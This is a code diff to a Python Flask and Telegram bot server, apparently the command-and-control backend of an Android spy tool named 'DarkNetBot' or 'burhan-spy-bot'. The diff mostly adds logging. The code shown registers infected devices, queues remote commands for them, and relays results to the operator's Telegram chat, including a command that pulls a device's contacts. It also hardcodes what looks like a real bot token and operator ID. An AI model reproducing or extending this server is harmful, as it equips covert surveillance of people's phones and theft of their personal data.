@@ -4,7 +4,12 @@ import os
 import time
 import base64
 import io
+import logging
 from flask import Flask, request, jsonify
+
+# ===== LOGGING SETUP =====
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger("DarkNetBot")
 
 # ===== CONFIGURATION =====
 BOT_TOKEN = "8811118034:AAH2sIRrIgGq1yH6PqelH9mKJrzwkHK_jIs"
@@ -12,7 +17,7 @@ OWNER_ID = 2062068620
 PUBLIC_URL = "https://burhan-spy-bot-production.up.railway.app"
 PORT = int(os.environ.get('PORT', 8080))
 
-# ===== DATABASE (Railway writable /tmp path) =====
+# ===== DATABASE (Railway /tmp) =====
 DB_PATH = "/tmp/devices.db"
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 c = conn.cursor()
@@ -24,7 +29,7 @@ c.execute("""CREATE TABLE IF NOT EXISTS devices (
 )""")
 conn.commit()
 
-# ===== BOT & FLASK INIT =====
+# ===== BOT & FLASK =====
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
@@ -33,13 +38,21 @@ device_commands = {}
 
 # ===== HELPER FUNCTIONS =====
 def db_add_device(device_id, key, expiry):
-    c.execute("INSERT OR REPLACE INTO devices (device_id, key, expiry, registered_at) VALUES (?, ?, ?, ?)",
-              (device_id, key, expiry, time.strftime("%Y-%m-%d %H:%M:%S")))
-    conn.commit()
+    try:
+        c.execute("INSERT OR REPLACE INTO devices (device_id, key, expiry, registered_at) VALUES (?, ?, ?, ?)",
+                  (device_id, key, expiry, time.strftime("%Y-%m-%d %H:%M:%S")))
+        conn.commit()
+        logger.info(f"Device registered: {device_id}")
+    except Exception as e:
+        logger.error(f"DB error: {e}")
 
 def db_get_all_devices():
-    c.execute("SELECT device_id, key, expiry FROM devices")
-    return c.fetchall()
+    try:
+        c.execute("SELECT device_id, key, expiry FROM devices")
+        return c.fetchall()
+    except Exception as e:
+        logger.error(f"DB get error: {e}")
+        return []
 
 def is_owner(message):
     return message.chat.id == OWNER_ID
@@ -162,12 +175,12 @@ def contacts(message):
     except:
         bot.reply_to(message, "Usage: /contacts <device_id>")
 
-# ===== FLASK ENDPOINTS (For Android & Webhook) =====
+# ===== FLASK ENDPOINTS =====
 
 @app.route('/register', methods=['POST'])
 def register():
     try:
-        data = request.json
+        data = request.get_json()
         device_id = data.get('device_id')
         key = data.get('key')
         expiry = data.get('expiry', 'N/A')
@@ -176,6 +189,7 @@ def register():
             return jsonify({"status": "ok"})
         return jsonify({"status": "error"}), 400
     except Exception as e:
+        logger.error(f"Register error: {e}")
         return jsonify({"status": "error", "msg": str(e)}), 500
 
 @app.route('/get_command', methods=['GET'])
@@ -188,12 +202,13 @@ def get_command():
         else:
             return jsonify({"command": "none"})
     except Exception as e:
+        logger.error(f"get_command error: {e}")
         return jsonify({"command": "none"}), 500
 
 @app.route('/post_result', methods=['POST'])
 def post_result():
     try:
-        data = request.json
+        data = request.get_json()
         device_id = data.get('device_id')
         result = data.get('result')
         msg_type = data.get('type', 'text')
@@ -212,22 +227,25 @@ def post_result():
             bot.send_message(OWNER_ID, f"📋 Result from {device_id}:\n{result}")
         return jsonify({"status": "ok"})
     except Exception as e:
+        logger.error(f"post_result error: {e}")
         return jsonify({"status": "error", "msg": str(e)}), 500
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
+        logger.info("WEBHOOK HIT!")
         json_string = request.get_data().decode('utf-8')
+        logger.info(f"Update received: {json_string}")
         update = telebot.types.Update.de_json(json_string)
         bot.process_new_updates([update])
         return "ok", 200
     except Exception as e:
-        return f"error: {str(e)}", 500
+        logger.error(f"Webhook error: {e}")
+        return "error", 500
 
-# ===== START SERVER (NO POLLING) =====
+# ===== START =====
 if __name__ == "__main__":
-    # Ensure no polling is running
     bot.remove_webhook()
     bot.set_webhook(url=f"{PUBLIC_URL}/webhook")
-    # Serving via Gunicorn or Flask
+    logger.info(f"Webhook set to: {PUBLIC_URL}/webhook")
     app.run(host="0.0.0.0", port=PORT)
